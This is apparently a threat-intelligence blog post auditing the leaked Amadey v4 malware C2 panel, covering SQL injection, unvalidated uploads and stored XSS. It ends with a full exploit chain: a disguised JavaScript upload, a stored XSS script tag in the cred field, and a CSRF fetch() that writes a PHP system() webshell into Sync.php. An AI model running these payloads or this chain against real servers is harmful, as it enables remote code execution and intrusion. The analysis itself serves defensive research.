**Background**

Amadey is a [lightweight but persistent malware strain originally observed in the wild around early 2018](https://www.splunk.com/en_us/blog/security/amadey-threat-analysis-and-detections.html). Designed primarily as a loader, it has evolved over time into a more versatile stealer, often serving as a second-stage tool in multi-pronged intrusion campaigns. Its compact codebase and modular design make it attractive to threat actors operating commodity malware campaigns, especially in conjunction with other malware like SmokeLoader, RedLine, or Raccoon. Amadey typically facilitates the silent installation of additional payloads, command execution, the collection of basic system reconnaissance data, and the exfiltration of browser-stored credentials and files of interest.

Throughout its evolution, Amadey has maintained a low profile, favoring stealth and simplicity over flashy capabilities. While not as well-known in mainstream threat reporting as major info-stealers like Vidar or Agent Tesla, it has quietly persisted in cybercrime ecosystems, often distributed through exploit kits, malicious spam campaigns, and cracked software bundles. It‚Äôs also [shown up in APT campaigns](https://www.microsoft.com/en-us/security/blog/2024/12/11/frequent-freeloader-part-ii-russian-actor-secret-blizzard-using-tools-of-other-groups-to-attack-ukraine/), [notably SECRET BLIZZARD in late 2024](https://socprime.com/blog/secret-blizzard-attack-detection/). Its C2 communications have historically relied on plaintext HTTP, making it easy to analyze but also trivial for actors to repurpose or host on low-cost infrastructure. Despite its minimal footprint, Amadey's success lies in its reliability and ease of customization for cybercriminals.

**Features**

I certainly recommend [g0njxa‚Äôs interview](https://g0njxa.medium.com/approaching-stealers-devs-a-brief-interview-with-amadey-56c8c6ea0ad6) with Amadey‚Äôs creator, InCrease. About 500 bucks in the right forums and it‚Äôs yours.

As a Loader, Amadey‚Äôs primary purpose is to maintain C2 and spin up new tasks for the infected system to execute. This can be .exe install, .ps1, .dll, etc. When the infected system checks in, it will check for new tasks and execute any new ones.

**The Leak**

In May 2024, the complete source code of Amadey v4 was [leaked](https://x.com/vxunderground/status/1788391188078231764?lang=en) on an underground forum, providing rare insight into the malware‚Äôs internals and development practices. It‚Äôs currently [available on vxunderground‚Äôs GitHub](https://github.com/vxunderground/MalwareSourceCode/blob/main/Panel/Panel.Amadey.d.c.7z). The leak includes the builder, panel code, and client source‚Äîoffering a full end-to-end look at how the malware is deployed, operated, and monetized. Unlike earlier versions, v4 introduces several enhancements aimed at evasion and scalability, including improved bot tracking, updated injection routines, and a refactored panel written in PHP. The leak has since circulated widely, and has already led to the creation of forked variants and clones, some of which have begun appearing in active campaigns.

In the rest of this post, I‚Äôll dive into the leaked Amadey v4 source code as a demonstration of a fun little known about C2 frameworks ‚Äì Blue Teams tend to inherently know that two-way communication comes with vulnerability. Shoddy C2 is no exception. I suppose this could also serve as a demonstration of a code audit (lol) ‚Äì though that is not something I would consider myself any good at.

**Index.php**

Let‚Äôs start with the main piece. Index.php is generally the C2 mechanism in which infected systems will beacon. Analysts can find system information and other data passed within the packet body.


![image](https://github.com/user-attachments/assets/c11c9196-2988-4e91-a01e-c55309f17a8d)

So this is the main input for data to the C2 web app, so there‚Äôs probably some good stuff in here. First, one might suspect (and they‚Äôd be correct) that there‚Äôs SQL Injection vulnerabilities all over the place.

![image](https://github.com/user-attachments/assets/99e17c27-97e4-4ff9-b747-79fd861e6644)

Here, if $taskid is crafted as ' OR 1=1 --, it could manipulate the query.

![image](https://github.com/user-attachments/assets/4975f5b9-6c11-4f3c-b55d-eae908c8e609)

&nbsp;If $unit_id is malicious (e.g., ' OR '1'='1), it could leak all tasks.

But perhaps most predictably, there‚Äôs no input validation for much of the C2 data inbound. This makes sense, considering the C2 is optimized to accept anything for operator usability.

![image](https://github.com/user-attachments/assets/13f7aec6-4667-449e-a8c3-89eba0aca28e)

In this case, one could theoretically send a POST request with any file disguised as a JPG. Pin this concept, as it‚Äôs a reoccurring theme.

![image](https://github.com/user-attachments/assets/55cf8309-21f7-48bd-8698-75df5a3669de)

Likewise, here with TAR files, which (I think) are specific to Session data. More on this one later.

![image](https://github.com/user-attachments/assets/95df24e8-fbe0-4aaa-80ff-bca511a9337a)

Amadey prevents infection in CIS countries like a number of other malware strains by design, but this portion of index.php can bypass that. By trusting the HTTP_X_FORWARDED_FOR, an attacker could theoretically fake their IP to bypass this or load fake data. In short:

- The script **does not validate admin sessions** before processing requests.
- **Exploit**: Anyone can submit malicious data to:
    - Add fake bots (POST\["r"\]).
    - Inject stolen credentials (POST\["cred"\]).
    - Manipulate task execution (POST\["e0"\], POST\["d1"\]).

And finally, another example of lack of input validation, POST ‚Äúcred‚Äù is designed to collect browser credentials, and (notably) checks to make sure the id parameter is exactly 12 characters long. If it is, it parses the contents of the cred parameter by calling Parse_Credentials().

![image](https://github.com/user-attachments/assets/1051d861-ca6f-4bfb-b0df-9eb36d7d2ac3)

Nice. Stored XSS, potentially. Under the right circumstances, one could theoretically inject HTML or JavaScript that would be stored on the backend. Let‚Äôs remember that too.

**Settings.php**

This is less interesting but there‚Äôs an important piece in here so I‚Äôll cover it briefly. It goes without saying that all of Settings.php requires an authenticated user for any interaction:

![image](https://github.com/user-attachments/assets/927bc53c-5065-432c-987f-fff00ec3a22d)

This probably explains why there‚Äôs no input sanitization literally anywhere here. The idea is that the operator would be logged in, and then Settings could be tweaked by said authenticated operator. Makes sense.

It's not always clear which POST actions are referenced or re-rendered in the panel, but several ‚Äî like the wallets update handler ‚Äî appear to take user-supplied input with no sanitization. If any of these fields are later inserted into the HTML (for example, into a &lt;input value="..."&gt;), they present a strong vector for stored XSS. This includes the cryptocurrency wallet fields, which can be overwritten with payloads that will execute when the admin revisits the Settings page.

![image](https://github.com/user-attachments/assets/29e18dce-89c3-4eb5-9111-d8905f79acae)

Much like SyncTime. This setting allows the operator to set how often the infected system checks in, but the field accepts arbitrary strings. There‚Äôs zero input validation, no encoding, and no length restrictions. You can drop in a full &lt;script&gt; tag, base64 payload, or even attempt PHP injection ‚Äì but it does require an authenticated user to get there.

**The Exploit Chain**

This is for educational and threat intelligence purposes only, hacking is illegal and all that. This doesn‚Äôt work anymore anyway, er.. so I‚Äôve heard. Anyway ‚Äì

Step 1.) First, we take advantage of missing content validation in index.php:

<pre><code>
if ($\_GET\["wal"\]) {

if (strcasecmp(GetFileExtension($\_FILES\['data'\]\['name'\]), 'tar') == 0) {

move_uploaded_file($\_FILES\['data'\]\['tmp_name'\], './Sessions/' . substr(GetFileName($\_FILES\['data'\]\['name'\]) , 0, 32) . '.tar') or die('');

}

exit;

}
</code></pre>
<br />

This lets us send a GET /index.php?wal=1 with a file upload where the extension is .tar, **but the contents are actually malicious JavaScript**. We name it something like .tar (just .tar with no basename) to control how it gets referenced later.

The payload inside that .tar (really a .js) is:

<pre><code>
fetch("/settings.php", {

method: "POST",

body: "sync=1&SyncTime=&lt;?php system($\_GET\[\\"cmd\\"\]); ?&gt;",

credentials: "include"

});
</code></pre>

****
<br />
This JavaScript abuses the fact that settings.php accepts arbitrary POST input for SyncTime **without any sanitization**:
<br />
<pre><code>
if (isset($\_POST\["sync"\])) {

SaveSyncTime($\_POST\["SyncTime"\]);

die;

}
</code></pre>
<br />

SaveSyncTime() writes this raw value directly into Cfg/Sync.php, which is then executable as PHP. This gives us a classic webshell at /Cfg/Sync.php?cmd=....

Step 2.) But as we‚Äôve established‚Ä¶ the JS doesn‚Äôt run by itself ‚Äî we need a way to **execute it within the operator‚Äôs browser**.

So we exploit a separate issue ‚Äî **a stored XSS injection** ‚Äî also in index.php:

<pre><code>
if ($\_POST\["cred"\]) {

if (strlen($\_POST\["id"\]) == 12) {

Parse_Credentials($\_POST\["cred"\], ':::');

}

exit;

}
</code></pre>
<br />

This lets us send a POST request like:

``cred=<script src="./Sessions/.tar"></script>&id=86753091234``

That cred value is ultimately passed through to the database (via AddToCredBase) **with no HTML escaping or validation**, and then rendered raw in show_cred.php:

<br />
<pre><code>
echo "&lt;td&gt;" . $row\['login'\] . "&lt;/td&gt;";
</code></pre>
<br />

So when the C2 operator views show_cred.php, the XSS is triggered, and our uploaded .js file (disguised as a .tar) gets loaded and executed in their browser.

Because the operator is already authenticated, the script executes a **CSRF-style POST** to settings.php, which writes our PHP payload into sync.php.

<br />
**üîó Chain Summary**

1. **Upload fake .tar file** (actually JS) via ?wal=1 ‚Üí saved as /Sessions/.tar.
2. **Inject stored XSS** using cred=&lt;script src="./Sessions/.tar"&gt;&lt;/script&gt;.
3. **Wait for operator to view show_cred.php**, triggering the XSS.
4. **Malicious JS runs**, CSRF-posts PHP payload to settings.php.

**Sync.php is overwritten** with attacker-controlled PHP ‚Üí fully functional webshell. All possible with a couple curl commands.
